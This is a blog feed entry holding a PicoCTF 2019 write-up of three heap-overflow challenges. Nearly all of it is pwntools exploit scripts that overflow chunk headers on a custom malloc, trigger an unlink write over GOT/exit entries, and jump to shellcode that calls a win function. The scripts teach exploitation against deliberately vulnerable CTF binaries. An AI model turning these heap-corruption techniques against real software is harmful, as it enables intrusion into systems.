// API callback
random_posts({"version":"1.0","encoding":"UTF-8","feed":{"xmlns":"http://www.w3.org/2005/Atom","xmlns$openSearch":"http://a9.com/-/spec/opensearchrss/1.0/","xmlns$blogger":"http://schemas.google.com/blogger/2008","xmlns$georss":"http://www.georss.org/georss","xmlns$gd":"http://schemas.google.com/g/2005","xmlns$thr":"http://purl.org/syndication/thread/1.0","id":{"$t":"tag:blogger.com,1999:blog-8814147965526194982"},"updated":{"$t":"2021-11-30T16:35:33.972-08:00"},"title":{"type":"text","$t":"Will's Root"},"subtitle":{"type":"html","$t":"Pentesting, CTFs, and Writeups"},"link":[{"rel":"http://schemas.google.com/g/2005#feed","type":"application/atom+xml","href":"https:\/\/www.willsroot.io\/feeds\/posts\/default"},{"rel":"self","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default?alt=json-in-script\u0026start-index=33\u0026max-results=1"},{"rel":"alternate","type":"text/html","href":"https:\/\/www.willsroot.io\/"},{"rel":"hub","href":"http://pubsubhubbub.appspot.com/"},{"rel":"previous","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default?alt=json-in-script\u0026start-index=32\u0026max-results=1"},{"rel":"next","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default?alt=json-in-script\u0026start-index=34\u0026max-results=1"}],"author":[{"name":{"$t":"Unknown"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"http://schemas.google.com/g/2005#thumbnail","width":"16","height":"16","src":"https:\/\/img1.blogblog.com\/img\/b16-rounded.gif"}}],"generator":{"version":"7.00","uri":"http://www.blogger.com","$t":"Blogger"},"openSearch$totalResults":{"$t":"54"},"openSearch$startIndex":{"$t":"33"},"openSearch$itemsPerPage":{"$t":"1"},"entry":[{"id":{"$t":"tag:blogger.com,1999:blog-8814147965526194982.post-8180971592357509635"},"published":{"$t":"2019-10-11T13:39:00.001-07:00"},"updated":{"$t":"2019-10-19T09:08:17.923-07:00"},"title":{"type":"text","$t":"PicoCTF 2019 Heap Overflow Writeup"},"content":{"type":"html","$t":"PicoCTF 2019 this year had 3 heap pwns with custom mallocs.\u003Cbr \/\u003E\u003Cbr \/\u003ENote that in both Afterlife and Secondlife, the exploit was very similar to the hints.\u0026nbsp; You just had to flip the order of the addresses you place and slightly change the offset (by debugging in gdb) because the malloc was custom, but very similar to dlmalloc.\u0026nbsp; In the end, my script for both were the same.\u0026nbsp; The only differences were the win address.\u0026nbsp; Here was the basis of the script for both:\u003Cbr \/\u003E\u003Cbr \/\u003E\u003Cdiv class=\"code\"\u003Efrom pwn import *\u003Cbr \/\u003Econtext.log_level = 'debug'\u003Cbr \/\u003E#http:\/\/homes.sice.indiana.edu\/yh33\/Teaching\/I433-2016\/lec13-HeapAttacks.pdf\u003Cbr \/\u003E#basically same attack as secondlife\u003Cbr \/\u003Eshellcode = '\\x90' * 0x80 + '\\xB8\\x66\\x89\\x04\\x08\\xFF\\xD0' + '\\x90' * 0x80\u003Cbr \/\u003E'''\u003Cbr \/\u003Emov eax, 0x08048966\u003Cbr \/\u003Ecall eax\u003Cbr \/\u003E'''\u003Cbr \/\u003Eexit = 0x804d02c\u003Cbr \/\u003Eremote = ssh(DETAILS OMMITTED)\u003Cbr \/\u003Eremote.set_working_directory('\/problems\/afterlife_4_1753231287c321c4b5b1102d1b2272c6')\u003Cbr \/\u003E#p = process(['.\/vuln', 'blah'])\u003Cbr \/\u003Ep = remote.process(['.\/vuln', 'blah'])\u003Cbr \/\u003Ep.recvline()\u003Cbr \/\u003Eleak = p.recvline()\u003Cbr \/\u003Eleak = int(leak)\u003Cbr \/\u003Elog.info('Leak: ' + hex(leak))\u003Cbr \/\u003Ep.interactive()\u003Cbr \/\u003Ep.recvrepeat(0.3)\u003Cbr \/\u003E#p.sendline(p32(exit - 12) + p32(leak + 16) + shellcode)\u003Cbr \/\u003Ep.sendline(p32(leak + 16) + p32(exit - 8) + shellcode)\u003Cbr \/\u003Eprint p.recvall()\u003C\/div\u003E\u003Cbr \/\u003E\u003Cbr \/\u003E\u003Cb\u003EHeap Overflow\u003C\/b\u003E\u003Cbr \/\u003EOnce again, another very similar payload is used on this custom malloc\/free program.\u0026nbsp; Comments for the variation are in the script itself. \u003Cbr \/\u003E\u003Cdiv class=\"code\"\u003Efrom pwn import *\u003Cbr \/\u003E\u003Cbr \/\u003Ewin = 0x08048936\u003Cbr \/\u003Eexit = 0x804d02c\u003Cbr \/\u003Efree = 0x8049aa4\u003Cbr \/\u003Econtext.log_level = 'debug'\u003Cbr \/\u003E\u003Cbr \/\u003E#https:\/\/www.win.tue.nl\/~aeb\/linux\/hh\/hh-11.html\u003Cbr \/\u003Eremote = ssh(DETAILS OMITTED)\u003Cbr \/\u003Eremote.set_working_directory('\/problems\/heap-overflow_6_b4a1244485bc8fdf27646e1db83dc360')\u003Cbr \/\u003Ep = remote.process('.\/vuln')\u003Cbr \/\u003E#target first big chunk, overwrite puts@GOT with exit\u003Cbr \/\u003E\u003Cbr \/\u003Ep.recvline()\u003Cbr \/\u003Eleak = int(p.recvline())\u003Cbr \/\u003Ep.recvline()\u003Cbr \/\u003Elog.info('Leak: ' + hex(leak))\u003Cbr \/\u003E#668 begins overflow\u003Cbr \/\u003E'''\u003Cbr \/\u003ESuccess! Watch carefully: p and q are 1032 (0x408) apart. The second 0xfffffffc overflows the size field of the buffer q with an even value (-4), so the prev_size field (also -4) is valid, and we subtract it from the pointer (q-8) to the struct chunk of q in order to get the pointer (q-4) to its predecessor. Now the assignments fwd-\u0026gt;bk = bck; bck-\u0026gt;fd = fwd; become *(A+12) = B; *(B+8) = A where A = 0x080495e8 is \u0026amp;n - 12 and B = 0xbfffff80 is some random address on the stack. Now *(A+12) = B does n = B, and that is what we see.\u003Cbr \/\u003E'''\u003Cbr \/\u003E#padding till overflow + valid prev size and valid size + padding + address to leak and then puts@GOT-8\u003Cbr \/\u003Eshellcode = '\\x90' * 60 + '\\xB8\\x36\\x89\\x04\\x08\\xFF\\xD0' + '\\x90' * 100\u003Cbr \/\u003E'''\u003Cbr \/\u003Emov eax, 0x08048936\u003Cbr \/\u003Ecall eax\u003Cbr \/\u003E'''\u003Cbr \/\u003Eshellcode = shellcode + 'A' * (664 - len(shellcode))\u003Cbr \/\u003Epayload = shellcode + p32(0xfffffffc) + p32(0xfffffffc) + p32(0x804d028-12) + p32(leak + 20)\u003Cbr \/\u003Ep.sendline(payload)\u003Cbr \/\u003Ep.interactive()\u003Cbr \/\u003Ep.sendline()\u003Cbr \/\u003Eprint p.recvall()\u003Cbr \/\u003E'''\u003Cbr \/\u003Ebreak here\u003Cbr \/\u003E0x8049bee \u0026lt;free+330\u0026gt;:\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Emov\u0026nbsp; \u0026nbsp; DWORD PTR [eax+0xc],edx\u003Cbr \/\u003E'''\u003C\/div\u003EThese challenges were really easy heap challenges and were sort of weird too. "},"link":[{"rel":"replies","type":"application/atom+xml","href":"https:\/\/www.willsroot.io\/feeds\/8180971592357509635\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"https:\/\/www.willsroot.io\/2019\/10\/picoctf-2019-afterlife-secondlife-and.html#comment-form","title":"0 Comments"},{"rel":"edit","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default\/8180971592357509635"},{"rel":"self","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default\/8180971592357509635"},{"rel":"alternate","type":"text/html","href":"https:\/\/www.willsroot.io\/2019\/10\/picoctf-2019-afterlife-secondlife-and.html","title":"PicoCTF 2019 Heap Overflow Writeup"}],"author":[{"name":{"$t":"Unknown"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"http://schemas.google.com/g/2005#thumbnail","width":"16","height":"16","src":"https:\/\/img1.blogblog.com\/img\/b16-rounded.gif"}}],"thr$total":{"$t":"0"}}]}});